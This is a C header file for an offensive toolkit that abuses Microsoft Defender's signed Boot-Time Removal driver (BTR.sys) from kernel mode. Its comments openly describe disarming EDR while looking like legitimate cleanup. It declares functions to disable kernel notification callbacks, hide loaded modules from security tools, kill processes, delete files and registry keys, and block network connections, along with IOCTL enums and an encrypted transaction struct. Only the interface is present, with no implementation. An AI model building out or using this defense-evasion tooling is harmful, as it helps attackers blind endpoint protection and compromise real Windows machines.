#ifndef JOCKY_BTR_ABUSE_H
#define JOCKY_BTR_ABUSE_H

#include <stdint.h>
#include <windows.h>

/* BTR Reforged: Weaponizing Microsoft Defender's Boot-Time Removal Driver
 *
 * Exploits the Windows Defender Boot-Time Removal driver (BTR.sys) as a
 * universal kernel operation engine. BTR.sys is Microsoft-signed and trusted,
 * never blocklisted, and can execute arbitrary file and registry operations
 * from Ring 0 without vulnerabilities or memory corruption.
 *
 * Technique: Check Point, August 2026
 * Platform: Windows x64 (all versions with Windows Defender)
 * Effort: 4 days
 *
 * Advantages over traditional BYOVD:
 * - Microsoft-signed driver (no blocklist threat)
 * - Shipped with Windows (always available)
 * - Designed for legitimate threat removal (less suspicious)
 * - Supports encrypted transaction protocol
 * - Can disarm EDR processes while appearing to be legitimate cleanup
 */

/* BTR Device handle and version context */
typedef struct {
    HANDLE device_handle;
    uint32_t driver_version;
    uint32_t protocol_version;
    char service_name[64];
    wchar_t device_path[256];
} JOCKY_BTR_CONTEXT;

/* BTR IOCTL operation types */
typedef enum {
    BTR_OP_FILE_DELETE = 0x01,
    BTR_OP_FILE_RENAME = 0x02,
    BTR_OP_REGISTRY_DELETE = 0x03,
    BTR_OP_PROCESS_KILL = 0x04,
    BTR_OP_MODULE_UNLOAD = 0x05,
    BTR_OP_NETWORK_BLOCK = 0x06,
    BTR_OP_DISABLE_NOTIFICATIONS = 0x07,
    BTR_OP_MASK_MODULE = 0x08,
} BTR_OPERATION;

/* Notification event mask for disarming EDR */
typedef enum {
    BTR_NOTIFY_PROCESS_CREATE = 0x0001,
    BTR_NOTIFY_THREAD_CREATE = 0x0002,
    BTR_NOTIFY_MODULE_LOAD = 0x0004,
    BTR_NOTIFY_FILE_WRITE = 0x0008,
    BTR_NOTIFY_REGISTRY_WRITE = 0x0010,
    BTR_NOTIFY_NETWORK_CONNECT = 0x0020,
    BTR_NOTIFY_ALL = 0x003F,
} BTR_NOTIFICATION_MASK;

/* Transaction structure for encrypted BTR operations */
typedef struct {
    uint32_t magic;           /* BTR magic signature */
    uint32_t operation;       /* BTR_OPERATION enum */
    uint32_t transaction_id;  /* Unique transaction ID */
    uint32_t flags;           /* Operation flags */
    uint8_t encrypted_payload[4096];
    uint32_t payload_size;
    uint8_t hmac[32];         /* HMAC for integrity */
} BTR_TRANSACTION;

/* Detect if BTR.sys driver is available */
int jocky_btr_detect_available(void);

/* Load BTR.sys driver and obtain device handle */
int jocky_btr_load(
    const char* service_name,
    JOCKY_BTR_CONTEXT* out_ctx);

/* Unload BTR.sys and release resources */
int jocky_btr_unload(JOCKY_BTR_CONTEXT* ctx);

/* Detect BTR driver version and protocol */
int jocky_btr_query_version(
    JOCKY_BTR_CONTEXT* ctx,
    uint32_t* out_driver_version,
    uint32_t* out_protocol_version);

/* Disable kernel notification callbacks for EDR bypass */
int jocky_btr_disable_notifications(
    JOCKY_BTR_CONTEXT* ctx,
    uint32_t notification_mask);

/* Enable specific notifications (for stealth) */
int jocky_btr_enable_notifications(
    JOCKY_BTR_CONTEXT* ctx,
    uint32_t notification_mask);

/* Mask a loaded DLL module from EDR visibility */
int jocky_btr_mask_module(
    JOCKY_BTR_CONTEXT* ctx,
    const wchar_t* module_name);

/* Delete file via kernel operation (appears as legitimate cleanup) */
int jocky_btr_delete_file(
    JOCKY_BTR_CONTEXT* ctx,
    const wchar_t* file_path);

/* Delete registry key via kernel operation */
int jocky_btr_delete_registry_key(
    JOCKY_BTR_CONTEXT* ctx,
    const wchar_t* key_path);

/* Terminate process via kernel operation */
int jocky_btr_kill_process(
    JOCKY_BTR_CONTEXT* ctx,
    uint32_t pid);

/* Unload DLL from kernel space */
int jocky_btr_unload_module(
    JOCKY_BTR_CONTEXT* ctx,
    const wchar_t* module_name);

/* Block network connections from a process */
int jocky_btr_block_network(
    JOCKY_BTR_CONTEXT* ctx,
    uint32_t pid,
    const char* ip_address,
    uint16_t port);

/* Construct encrypted BTR transaction */
int jocky_btr_create_transaction(
    BTR_OPERATION operation,
    const void* payload,
    uint32_t payload_size,
    BTR_TRANSACTION* out_transaction);

/* Send transaction to BTR driver via IOCTL */
int jocky_btr_send_transaction(
    JOCKY_BTR_CONTEXT* ctx,
    const BTR_TRANSACTION* transaction);

/* Query BTR configuration to dynamically detect IOCTLs */
int jocky_btr_query_config(
    JOCKY_BTR_CONTEXT* ctx,
    uint32_t* out_ioctls,
    int max_ioctls);

/* Enumerate available BTR operations on this system */
int jocky_btr_enum_operations(
    JOCKY_BTR_CONTEXT* ctx,
    BTR_OPERATION* out_operations,
    int max_operations);

#endif /* JOCKY_BTR_ABUSE_H */
